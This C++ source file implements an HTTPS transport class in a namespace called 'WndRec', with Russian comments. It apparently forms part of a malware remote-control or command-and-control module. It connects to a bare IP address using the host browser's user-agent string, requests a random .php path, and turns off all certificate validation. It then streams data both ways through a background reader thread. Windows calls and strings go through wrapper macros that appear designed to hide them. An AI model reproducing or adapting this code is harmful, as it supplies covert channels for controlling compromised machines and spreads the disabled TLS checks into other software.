#include "https.h"
#include "core\rand.h"
#include "core\debug.h"

namespace WndRec
{

HTTPS::HTTPS() : inet(0), connect(0), request(0)
{
	CriticalSection::Init(cs);
}
	
void HTTPS::Close()
{
	if( request ) API(WINHTTP, WinHttpCloseHandle)(request);
	if( connect ) API(WINHTTP, WinHttpCloseHandle)(connect);
	if( inet ) API(WINHTTP, WinHttpCloseHandle)(inet);
	request = 0;
	connect = 0;
	inet = 0;
}

bool HTTPS::Connect( const char* ip )
{
	DWORD szUserAgent;
	char userAgent[MAX_PATH];
	API(URLMON, ObtainUserAgentString)( 0, userAgent, &szUserAgent );
	wchar_t* ws = Str::ToWideChar( userAgent, szUserAgent );
	inet = API(WINHTTP, WinHttpOpen)( ws, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
	WStr::Free(ws);
	bool ret = false;
	if( inet  )
	{
		wchar_t* whost = Str::ToWideChar( ip, Str::Len(ip) );
		connect = API(WINHTTP, WinHttpConnect)( inet, whost, INTERNET_DEFAULT_HTTPS_PORT, 0 );
		StringBuilderStack<64> file;
		Rand::Gen( file, 8, 16 );
		file.Insert( 0, '/' );
		file += _CS_(".php");
		wchar_t* wfile = Str::ToWideChar( file, file.Len() );
		request = API(WINHTTP, WinHttpOpenRequest)( connect, 0, wfile, NULL, NULL, 0, WINHTTP_FLAG_SECURE ); 
		WStr::Free(wfile);
		DWORD flags;
		DWORD sz_flags = sizeof(flags);
		if( API(WINHTTP, WinHttpQueryOption)( request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, &sz_flags ) )
		{
			flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
			API(WINHTTP, WinHttpSetOption)( request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags) );
		}
		API(WINHTTP, WinHttpAddRequestHeaders)( request, _WCS_("Accept: */*"), -1, WINHTTP_ADDREQ_FLAG_ADD );
		BOOL res = API(WINHTTP, WinHttpSendRequest)( request, 0, 0, 0, 0, 0, 0 );        
		if( res )
		{
			Mem::Data responseData;
			if( API(WINHTTP, WinHttpReceiveResponse)( request, 0 ) )
			{
				DWORD available;
				for(;;)
				{
					if( API(WINHTTP, WinHttpQueryDataAvailable)( request, &available ) )
					{
						if( available == 0 ) break;
						responseData.MakeEnough(available);
						DWORD readed = 0;
						res = API(WINHTTP, WinHttpReadData)( request, responseData.PtrWrite(), available, &readed );
						if( !res ) 
						{
							break;
						}
						responseData.AddLen(readed);
					}
				}
				ret = true;
				RunThread( HTTPS::ThreadReader, this );
			}
			else
			{
			}
		}
		else
		{
		}
	}
	return ret;
}

int HTTPS::Write( Mem::Data& data )
{
	DWORD written = 0;
	if( API(WINHTTP, WinHttpWriteData)( request, data.Ptr(), data.Len(), &written ) )
		return written;
	else
		return SOCKET_ERROR;
}

int HTTPS::Read( Mem::Data& _data, int maxRead, int wait )
{
	int ret = 0;
	for(;;)
	{
		if( request == 0 ) break;
		if( data.Len() >= maxRead )
		{
			CriticalSection::Enter(cs);
			_data.Copy( 0, 0, maxRead, data);
			data.DelLeft(maxRead);
			CriticalSection::Leave(cs);
			ret = 1; //прочли указанное количество байт
			break;
		}
		if( wait == 0 ) 
		{
			ret = 3; //вышло время ожидания
			break;
		}
		wait--;
		Delay(1);
	}
	return ret;
}

DWORD WINAPI HTTPS::ThreadReader( void* v )
{
	DbgMsg( "Runned  HTTPS::ThreadReader()" );
	HTTPS* https = (HTTPS*)v;
	https->data.SetLen(0);
	while( https->Connected() )
	{
		DWORD available = 0;
		if( API(WINHTTP, WinHttpQueryDataAvailable)( https->request, &available ) )
		{
			CriticalSection::Enter(https->cs);
			https->data.MakeEnough(available);
			DWORD readed = 0;
			API(WINHTTP, WinHttpReadData)( https->request, https->data.PtrWrite(), available, &readed );
			DbgMsg( "HTTPS::ThreadReader() readed bytes %d", readed );
			https->data.AddLen(readed);
			CriticalSection::Leave(https->cs);
		}
		else
		{
			https->Close();
			break;
		}
	}
	DbgMsg( "Stopped HTTPS::ThreadReader()" );
	return 0;
}

}
